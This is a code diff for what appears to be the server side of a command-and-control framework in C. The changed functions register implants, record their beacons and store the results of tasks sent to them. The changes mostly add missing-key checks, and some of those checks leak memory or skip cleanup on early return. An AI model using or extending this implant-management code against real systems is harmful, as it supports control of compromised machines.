@@ -36,9 +36,23 @@ void GenerateID(const char *input, char output[9]) {
 
 
 char *register_implant(MYSQL* con, cJSON *json, char *ip) {
+
+    cJSON *json_reply = cJSON_CreateObject();
+
     cJSON *hostname =  cJSON_GetObjectItem(json, "hostname");
+    if (!hostname) {
+        return NULL;
+    }
+
     cJSON *os =  cJSON_GetObjectItem(json, "os");
+    if (!os) {
+        return NULL;
+    }
+
     cJSON *arch = cJSON_GetObjectItem(json, "arch");
+    if (!arch) {
+        return NULL;
+    }
 
     char input[255];
     snprintf(input, sizeof(input), "%s-%s-%s", hostname->valuestring, os->valuestring, arch->valuestring);
@@ -70,21 +84,25 @@ char *register_implant(MYSQL* con, cJSON *json, char *ip) {
 
     // reply with agent id
     REPLY:
-    cJSON *json_reply = cJSON_CreateObject();
+    
     cJSON_AddStringToObject(json_reply, "mode", "ack");
     cJSON_AddStringToObject(json_reply, "implant_id", implant_id);
-
     char *reply = cJSON_Print(json_reply);
-    //send(sock, reply, strlen(reply), 0);
     cJSON_Delete(json_reply);
     return reply;
 }
 
 char *beacon_implant(MYSQL* con, cJSON *json) {
     cJSON *implant_id = cJSON_GetObjectItem(json, "implant_id");
-    // log
-    log_message(LOG_INFO, "Beacon from %s", implant_id->valuestring);
     cJSON *json_reply = cJSON_CreateObject();
+    if (!implant_id) {
+        cJSON_AddStringToObject(json_reply, "mode", "none");
+        char *reply = cJSON_Print(json_reply);
+        cJSON_Delete(json_reply);
+        return reply;
+    }
+    // log
+    
     // update last seen
     update_last_seen(con, implant_id->valuestring);
     // validate if agent id exists in the database.
@@ -148,7 +166,7 @@ void *implant_handler(void *args) {
 
     struct implant_handler_t *arg = (struct implant_handler_t*)args;
     
-    
+
     MYSQL *con = get_db_connection();
 
     if (con == NULL) {
@@ -220,6 +238,9 @@ void *implant_handler(void *args) {
             log_message(LOG_WARN, "NO mode key in JSON");
         } else if (strcmp(type->valuestring, "register") == 0) {
             char *reply = register_implant(con, json, arg->ip);
+            
+            if (reply == NULL) return NULL;
+
             SSL_write(ssl, reply, strlen(reply));
             free(reply);
         } else if (strcmp(type->valuestring, "beacon") == 0) {
@@ -247,7 +268,17 @@ void *implant_handler(void *args) {
                 goto CLEANUP;
             }
             cJSON *command_response = cJSON_GetObjectItem(response, "response");
+            if (!command_response) {
+                log_message(LOG_ERROR, "Invalid or missing key [response]" );
+                cJSON_Delete(response);
+                return NULL;
+            }
             cJSON *task_id = cJSON_GetObjectItem(response, "task_id");
+            if (!task_id) {
+                log_message(LOG_ERROR, "Invalid or missing key [task_id]" );
+                cJSON_Delete(response);
+                return NULL;
+            }
             store_task_response(con, command_response->valuestring, task_id->valueint);
             cJSON_Delete(response);
         }
@@ -307,7 +338,17 @@ void *implant_handler(void *args) {
                 goto CLEANUP_2;
             }
             cJSON *command_response = cJSON_GetObjectItem(response, "response");
+            if (!command_response) {
+                log_message(LOG_ERROR, "Invalid or missing key [response]" );
+                cJSON_Delete(response);
+                return NULL;
+            }
             cJSON *task_id = cJSON_GetObjectItem(response, "task_id");
+            if (!task_id) {
+                log_message(LOG_ERROR, "Invalid or missing key [task_id]" );
+                cJSON_Delete(response);
+                return NULL;
+            }
             store_task_response(con, command_response->valuestring, task_id->valueint);
             cJSON_Delete(response);
             }
